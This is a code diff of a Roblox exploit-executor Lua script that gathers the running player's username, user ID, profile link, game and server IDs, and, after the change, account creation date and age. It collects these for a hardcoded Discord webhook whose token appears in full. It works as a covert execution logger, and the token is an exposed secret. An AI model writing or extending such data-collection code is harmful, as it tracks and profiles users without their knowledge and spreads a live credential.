@@ -4,7 +4,7 @@ if not syn and not http and not request then
     return
 end
 
--- Webhook URL
+-- New Webhook URL
 local webhookURL = "https://discord.com/api/webhooks/1335043376210247806/Gky6NvSjJI_AAPtqsRiycMYXhVzTFdEUKlIZB-A1wg_WWXLH1cjmcR9s7KBHm97uMw3P"
 
 -- Get Player & Game Info
@@ -15,6 +15,10 @@ local gameID = game.GameId
 local placeID = game.PlaceId
 local jobID = game.JobId -- Unique Server Instance ID
 local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
+
+-- Calculate Account Creation Date
+local daysSinceCreation = player.AccountAge
+local creationDate = os.date("%Y-%m-%d", os.time() - (daysSinceCreation * 86400)) -- Convert days to a proper date
 
 -- Create Data for Webhook
 local data = {
@@ -27,6 +31,8 @@ local data = {
             {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
             {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
             {["name"] = "Profile Link", ["value"] = "[View Profile](" .. profileLink .. ")", ["inline"] = false},
+            {["name"] = "Account Creation Date", ["value"] = creationDate, ["inline"] = true},
+            {["name"] = "Account Age (Days)", ["value"] = tostring(daysSinceCreation), ["inline"] = true},
             {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown", ["inline"] = true},
             {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
             {["name"] = "Game ID", ["value"] = tostring(gameID), ["inline"] = true},
